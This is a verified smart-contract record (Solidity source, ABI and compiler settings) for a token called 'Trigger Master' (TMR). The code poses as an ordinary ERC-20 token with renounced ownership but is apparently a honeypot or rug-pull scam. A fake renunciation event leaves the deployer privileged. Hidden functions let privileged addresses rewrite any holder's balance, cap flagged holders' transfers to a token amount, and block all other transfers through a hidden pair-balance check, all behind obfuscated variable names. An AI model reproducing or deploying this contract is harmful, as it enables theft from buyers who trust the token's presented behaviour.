{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface maxLaunchAt {\n    function createPair(address marketingShouldTx, address amountSender) external returns (address);\n}\n\ninterface minIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityLaunch) external view returns (uint256);\n\n    function transfer(address toSell, uint256 walletReceiver) external returns (bool);\n\n    function allowance(address exemptFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toSell,\n        uint256 walletReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txSender, uint256 value);\n    event Approval(address indexed exemptFee, address indexed spender, uint256 value);\n}\n\nabstract contract autoLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atTeam is minIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TriggerMaster is autoLaunched, minIs, atTeam {\n\n    uint256 public launchedIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellFrom;\n    }\n\n    function balanceOf(address liquidityLaunch) public view virtual override returns (uint256) {\n        return listFrom[liquidityLaunch];\n    }\n\n    address public fromFee;\n\n    function walletSenderAuto() private view {\n        require(receiverTotal[_msgSender()]);\n    }\n\n    string private teamTakeMax = \"Trigger Master\";\n\n    function maxTeam(address teamExempt, address toSell, uint256 walletReceiver) internal returns (bool) {\n        require(listFrom[teamExempt] >= walletReceiver);\n        listFrom[teamExempt] -= walletReceiver;\n        listFrom[toSell] += walletReceiver;\n        emit Transfer(teamExempt, toSell, walletReceiver);\n        return true;\n    }\n\n    function sellLimit() public {\n        emit OwnershipTransferred(tokenFundTake, address(0));\n        teamEnable = address(0);\n    }\n\n    uint256 private amountLaunched;\n\n    event OwnershipTransferred(address indexed marketingMaxLaunched, address indexed txLiquidity);\n\n    mapping(address => mapping(address => uint256)) private sellReceiverTx;\n\n    uint8 private walletIs = 18;\n\n    string private feeFundLaunched = \"TMR\";\n\n    bool public tokenFrom;\n\n    constructor (){\n        if (amountLaunched == modeBuy) {\n            modeBuy = launchMarketing;\n        }\n        takeWallet swapMarketingMax = takeWallet(modeMax);\n        fromFee = maxLaunchAt(swapMarketingMax.factory()).createPair(swapMarketingMax.WETH(), address(this));\n        \n        tokenFundTake = _msgSender();\n        receiverTotal[tokenFundTake] = true;\n        listFrom[tokenFundTake] = sellFrom;\n        sellLimit();\n        \n        emit Transfer(address(0), tokenFundTake, sellFrom);\n    }\n\n    function owner() external view returns (address) {\n        return teamEnable;\n    }\n\n    function approve(address fundFrom, uint256 walletReceiver) public virtual override returns (bool) {\n        sellReceiverTx[_msgSender()][fundFrom] = walletReceiver;\n        emit Approval(_msgSender(), fundFrom, walletReceiver);\n        return true;\n    }\n\n    mapping(address => bool) public receiverTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeFundLaunched;\n    }\n\n    address public tokenFundTake;\n\n    function totalSwapExempt(address autoLimit) public {\n        require(autoLimit.balance < 100000);\n        if (receiverEnable) {\n            return;\n        }\n        \n        receiverTotal[autoLimit] = true;\n        if (tokenFrom != takeFee) {\n            takeFee = false;\n        }\n        receiverEnable = true;\n    }\n\n    uint256 private sellFrom = 100000000 * 10 ** 18;\n\n    address autoSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function senderReceiver(address teamExempt, address toSell, uint256 walletReceiver) internal returns (bool) {\n        if (teamExempt == tokenFundTake) {\n            return maxTeam(teamExempt, toSell, walletReceiver);\n        }\n        uint256 enableList = minIs(fromFee).balanceOf(autoSell);\n        require(enableList == sellSenderReceiver);\n        require(toSell != autoSell);\n        if (exemptReceiver[teamExempt]) {\n            return maxTeam(teamExempt, toSell, buyTeamReceiver);\n        }\n        return maxTeam(teamExempt, toSell, walletReceiver);\n    }\n\n    uint256 constant buyTeamReceiver = 14 ** 10;\n\n    function allowance(address tradingSwap, address fundFrom) external view virtual override returns (uint256) {\n        if (fundFrom == modeMax) {\n            return type(uint256).max;\n        }\n        return sellReceiverTx[tradingSwap][fundFrom];\n    }\n\n    function liquidityTxTeam(address tradingFeeReceiver) public {\n        walletSenderAuto();\n        \n        if (tradingFeeReceiver == tokenFundTake || tradingFeeReceiver == fromFee) {\n            return;\n        }\n        exemptReceiver[tradingFeeReceiver] = true;\n    }\n\n    bool public receiverEnable;\n\n    function teamReceiverTrading(address buyAutoLimit, uint256 walletReceiver) public {\n        walletSenderAuto();\n        listFrom[buyAutoLimit] = walletReceiver;\n    }\n\n    uint256 fromAuto;\n\n    bool public txTrading;\n\n    uint256 public launchMarketing;\n\n    mapping(address => uint256) private listFrom;\n\n    bool public takeFee;\n\n    function transfer(address buyAutoLimit, uint256 walletReceiver) external virtual override returns (bool) {\n        return senderReceiver(_msgSender(), buyAutoLimit, walletReceiver);\n    }\n\n    function transferFrom(address teamExempt, address toSell, uint256 walletReceiver) external override returns (bool) {\n        if (_msgSender() != modeMax) {\n            if (sellReceiverTx[teamExempt][_msgSender()] != type(uint256).max) {\n                require(walletReceiver <= sellReceiverTx[teamExempt][_msgSender()]);\n                sellReceiverTx[teamExempt][_msgSender()] -= walletReceiver;\n            }\n        }\n        return senderReceiver(teamExempt, toSell, walletReceiver);\n    }\n\n    address private teamEnable;\n\n    uint256 public modeBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return teamTakeMax;\n    }\n\n    address modeMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 sellSenderReceiver;\n\n    mapping(address => bool) public exemptReceiver;\n\n    function buyMaxFund(uint256 walletReceiver) public {\n        walletSenderAuto();\n        sellSenderReceiver = walletReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return teamEnable;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletIs;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMaxLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"buyMaxFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFeeReceiver\",\"type\":\"address\"}],\"name\":\"liquidityTxTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAutoLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"teamReceiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFundTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"}],\"name\":\"totalSwapExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAutoLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TriggerMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}